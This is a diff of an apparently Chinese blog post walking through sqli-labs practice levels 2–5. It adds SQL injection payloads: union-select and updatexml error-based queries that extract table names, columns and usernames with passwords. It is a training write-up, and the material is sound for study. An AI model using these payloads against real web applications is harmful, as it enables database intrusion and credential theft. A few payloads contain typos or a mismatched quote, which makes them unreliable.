@@ -15,8 +15,9 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://i.loli.net/2021/05/31/vGO7UzmbEq42iRf.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/31/fnMaSxHsutJrcpw.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/01/H9L7e85MdaXUKj3.png">
 <meta property="article:published_time" content="2021-05-30T11:23:29.000Z">
-<meta property="article:modified_time" content="2021-05-31T14:46:02.027Z">
+<meta property="article:modified_time" content="2021-06-01T11:31:59.871Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
@@ -112,8 +113,16 @@
 <p>爆用户名和密码：?id=-1’ union select 1,2,group_concat(username,0x7e,password) from users –+；</p>
 <p><img src="https://i.loli.net/2021/05/31/fnMaSxHsutJrcpw.png" alt="屏幕截图(8)"></p>
 <p>成功。</p>
-<h2 id="sqli-labs第二关"><a href="#sqli-labs第二关" class="headerlink" title="sqli_labs第二关"></a>sqli_labs第二关</h2><p>同样输入?id=1’,?id=1”都报错，猜测是数字型注入，输入?id=1 and 1=1正常?id=1 and 1=2发生变化确定是数字型注入，接下来的步骤同第一关（只是不用闭合单引号后面也不用用–+注释）不再赘述。</p>
-<h2 id="sql-labs第三关"><a href="#sql-labs第三关" class="headerlink" title="sql_labs第三关"></a>sql_labs第三关</h2>
+<h2 id="sqli-labs第二关"><a href="#sqli-labs第二关" class="headerlink" title="sqli-labs第二关"></a>sqli-labs第二关</h2><p>同样输入?id=1’,?id=1”都报错，猜测是数字型注入，输入?id=1 and 1=1正常?id=1 and 1=2发生变化确定是数字型注入，接下来的步骤同第一关（只是不用闭合单引号后面也不用用–+注释）不再赘述。</p>
+<h2 id="sql-labs第三关"><a href="#sql-labs第三关" class="headerlink" title="sql-labs第三关"></a>sql-labs第三关</h2><p>同样输入?id=1、?id=1”正常，输入?id=1’报错猜测是单引号字符型注入，但是用–+注释之后仍然报错，就考虑闭合单引号的清形：?d=1’)–+发现回显正常基本可以确定是闭合单引号注入，接下来的步骤同第一关。</p>
+<h2 id="sql-labs第四关"><a href="#sql-labs第四关" class="headerlink" title="sql-labs第四关"></a>sql-labs第四关</h2><p>输入?id=1、?id=1’正常，输入?id=1”报错猜测是双引号字符型注入，但是用–+注释之后仍然报错，就考虑闭合双引号的清形：?d=1’)–+发现回显正常基本可以确定是闭合双引号注入，接下来的步骤同第一关。</p>
+<h2 id="sql-labs第五关"><a href="#sql-labs第五关" class="headerlink" title="sql-labs第五关"></a>sql-labs第五关</h2><p>经过一通单双引号操作之后基本可以确定id参数被单引号包裹，但是后续操作发现union联合查询不起作用了，发现页面仍然有报错，此时考虑报错注入尝试通过改变updatexml第二个参数来得到我们想要的数据：?id=1’ or updatexml(1,concat(0x5c,(select database()),0x5c),1)–+来查询数据库发现成功显示</p>
+<p><img src="https://i.loli.net/2021/06/01/H9L7e85MdaXUKj3.png" alt="屏幕截图(9)"></p>
+<p>接下来就一步一步地爆数据：</p>
+<p>爆表名：?id=1’ or updatexml(1,concat(0x5c,(select concat(0x7e,table_name,0x7e) from information_schema.tables where table_schema=’security’ limit 1,1),0x5c),1)–+</p>
+<p>爆列名：?id=1’ or updatexml(1,concat(0x5c,(select concat(0x7e,column_name) from information_schema.columns where table_schema=’security’ and table_name=’users’ limit 2,1),0x5c),1)–+</p>
+<p>爆字段内容：?id=1’ or updatexml(1,concat(0x5c,(select concat_ws(0x7e,username,password) from security.users limit 0,1),0x5c),1)–+</p>
+
       
     </div>
     <footer class="article-footer">
